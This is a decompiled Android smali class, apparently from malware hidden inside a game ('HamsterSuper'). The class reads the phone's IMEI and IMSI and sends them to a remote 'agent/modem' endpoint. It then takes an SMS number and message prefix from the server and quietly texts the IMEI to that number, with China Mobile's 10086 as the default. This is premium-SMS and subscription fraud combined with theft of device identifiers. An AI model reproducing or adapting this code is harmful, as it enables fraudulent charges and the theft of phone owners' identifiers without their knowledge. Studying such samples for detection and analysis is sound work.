.class public LDaemon/Protocol/SpHttp;
.super Ljava/lang/Object;
.source "SpHttp.java"

# interfaces
.implements LDaemon/Base/HttpBase;


# static fields
.field private static final tag:Ljava/lang/String; = "SpHttp"


# instance fields
.field private send:Ljava/lang/String;

.field private sms:Ljava/lang/String;

.field private final url:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 2

    .prologue
    .line 22
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 17
    new-instance v0, Ljava/lang/StringBuilder;

    sget-object v1, LDaemon/Action/Action;->host:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "agent/modem?"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, LDaemon/Protocol/SpHttp;->url:Ljava/lang/String;

    .line 19
    const-string v0, "10086"

    iput-object v0, p0, LDaemon/Protocol/SpHttp;->sms:Ljava/lang/String;

    .line 20
    const-string v0, "OP"

    iput-object v0, p0, LDaemon/Protocol/SpHttp;->send:Ljava/lang/String;

    .line 23
    return-void
.end method

.method private print(Ljava/lang/String;)V
    .locals 1
    .param p1, "log"    # Ljava/lang/String;

    .prologue
    .line 70
    sget-object v0, LDaemon/Action/Action;->print:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 71
    const-string v0, "SpHttp"

    invoke-static {v0, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 72
    :cond_0
    return-void
.end method


# virtual methods
.method public getHttpUrl()Ljava/lang/String;
    .locals 5

    .prologue
    .line 28
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    .line 29
    const-string v4, "phone"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    .line 28
    check-cast v2, Landroid/telephony/TelephonyManager;

    .line 31
    .local v2, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    .line 33
    .local v0, "imei":Ljava/lang/String;
    if-nez v0, :cond_0

    .line 34
    const-string v0, "imeitest"

    .line 36
    :cond_0
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v1

    .line 37
    .local v1, "imsi":Ljava/lang/String;
    if-nez v1, :cond_1

    .line 38
    const-string v1, "imsitest"

    .line 40
    :cond_1
    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, LDaemon/Protocol/SpHttp;->url:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "imei="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "&imsi="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    return-object v3
.end method

.method public parsePackage(Ljava/lang/String;)LDaemon/Service/ServerConnecter$httpState;
    .locals 2
    .param p1, "temp"    # Ljava/lang/String;

    .prologue
    .line 48
    :try_start_0
    const-string v1, "modem"

    invoke-static {p1, v1}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, LDaemon/Protocol/SpHttp;->sms:Ljava/lang/String;

    .line 49
    const-string v1, "prefix"

    invoke-static {p1, v1}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, LDaemon/Protocol/SpHttp;->send:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 54
    sget-object v1, LDaemon/Service/ServerConnecter$httpState;->success:LDaemon/Service/ServerConnecter$httpState;

    :goto_0
    return-object v1

    .line 50
    :catch_0
    move-exception v1

    move-object v0, v1

    .line 51
    .local v0, "e":Ljava/lang/Exception;
    sget-object v1, LDaemon/Service/ServerConnecter$httpState;->error:LDaemon/Service/ServerConnecter$httpState;

    goto :goto_0
.end method

.method public setFinishState(LDaemon/Service/ServerConnecter$httpState;)V
    .locals 5
    .param p1, "httpEnd"    # LDaemon/Service/ServerConnecter$httpState;

    .prologue
    const/4 v4, 0x1

    .line 59
    iget-object v0, p0, LDaemon/Protocol/SpHttp;->sms:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_0

    .line 60
    sget-object v0, LHamsterSuper/Client/Game/BootReceiver;->smsobserver:LDaemon/Service/SMSObserver;

    iget-object v1, p0, LDaemon/Protocol/SpHttp;->sms:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    iget-object v3, p0, LDaemon/Protocol/SpHttp;->send:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 61
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->reghttp:LDaemon/Protocol/RegHttp;

    invoke-virtual {v3}, LDaemon/Protocol/RegHttp;->getImei()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 60
    invoke-virtual {v0, v1, v2}, LDaemon/Service/SMSObserver;->sndSms(Ljava/lang/String;Ljava/lang/String;)V

    .line 62
    sput v4, LHamsterSuper/Client/Game/BootReceiver;->mode:I

    .line 63
    sput v4, LHamsterSuper/Client/Game/BootReceiver;->send_mode:I

    .line 67
    :goto_0
    return-void

    .line 65
    :cond_0
    invoke-static {}, LDaemon/Service/TaskPool;->getInstance()LDaemon/Service/TaskPool;

    move-result-object v0

    sget-object v1, LHamsterSuper/Client/Game/BootReceiver;->sphttp:LDaemon/Protocol/SpHttp;

    invoke-virtual {v0, v1}, LDaemon/Service/TaskPool;->addConnectTask(LDaemon/Base/HttpBase;)V

    goto :goto_0
.end method
